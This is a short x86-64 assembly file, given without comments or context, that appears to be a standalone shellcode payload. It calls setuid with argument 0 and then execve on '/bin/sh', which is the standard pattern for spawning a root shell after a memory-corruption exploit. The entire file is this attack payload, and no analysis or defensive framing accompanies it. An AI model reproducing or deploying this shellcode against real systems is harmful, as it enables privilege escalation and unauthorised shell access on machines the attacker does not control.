.text
  .globl _start
_start:
  xorq %rdi,%rdi
  mov $0x69,%al
  syscall
  xorq %rdx, %rdx
  movq $0x68732f6e69622fff,%rbx
  shr  $0x8, %rbx
  push %rbx
  movq %rsp,%rdi
  xorq %rax,%rax
  pushq %rax
  pushq %rdi
  movq %rsp,%rsi
  mov $0x3b,%al
  syscall
